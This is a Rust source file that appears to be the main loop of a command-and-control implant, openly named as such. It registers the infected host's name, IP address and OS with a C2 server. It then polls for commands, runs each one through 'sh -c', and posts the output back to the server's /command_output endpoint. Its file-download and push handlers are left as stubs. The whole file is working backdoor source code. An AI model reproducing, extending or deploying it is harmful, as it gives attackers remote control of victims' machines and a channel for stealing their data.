mod fileoperations;
mod implant_details;

use std::error::Error;
use std::process::Command;


use serde_json::json;


const SERVER_ADDR: (&str, u16) = ("127.0.0.1", 5000);
const BUFFER_SIZE: usize = 4096;

async fn run(implant_id: &str) -> Result<(), Box<dyn Error>> {
    let client = reqwest::Client::new();
    let hostname = implant_details::get_hostname().unwrap_or_else(|_| "unknown".to_string());
    let ip_address = implant_details::get_ip_address()?;
    let os = implant_details::get_os()?;

    // Initial check-in
    match implant_details::initial_check_in(&implant_id, &hostname, &ip_address, &os).await {
        Ok(_) => println!("Implant check-in successful."),
        Err(e) => {
            eprintln!("[-] Failed to register the implant");
            eprintln!("[!] Error: {}", e);
        }
    }

    loop {
        // Check for new commands from the C2 server
    
        let command = match implant_details::check_for_commands(&implant_id).await? {
            Some(cmd) => cmd,
            None => {
                println!("[*] No command to execute. Checking in normally."); // Add this line to print a message when there is no command
                tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
                continue;
            }
        };
    
        // Process the command
        println!("[*] Received command: {}", command);

        if command.starts_with("download ") {
            // ... handle "download" command
        } else if command.starts_with("push ") {
            // ... handle "push" command
        } else {
            let output = Command::new("sh")
                .arg("-c")
                .arg(&command)
                .output()?;
        
            println!("[*] Command executed");
        
            let output_str = String::from_utf8_lossy(&output.stdout).to_string();
        
            let output_data = json!({
                "implant_id": implant_id,
                "command": command,
                "command_output": output_str,
                "status": if output.status.success() { "success" } else { "failure" },
            });

            let c2_output_url = format!("http://{}:{}/command_output", SERVER_ADDR.0, SERVER_ADDR.1);
            println!("[*] Sending POST request to {} with data: {:?}", c2_output_url, output_data); // Add this line to print the POST request URL and JSON data
            client.post(&c2_output_url)
                .json(&output_data)
                .send()
                .await?;
        
            println!("[*] Sending output back to the C2 server");
        }
    }  
}      
#[tokio::main]
async fn main() {
    let implant_id = implant_details::generate_implant_id();
    
    if let Err(e) = run(&implant_id).await {
        eprintln!("[!] Error: {}", e);
    }
}

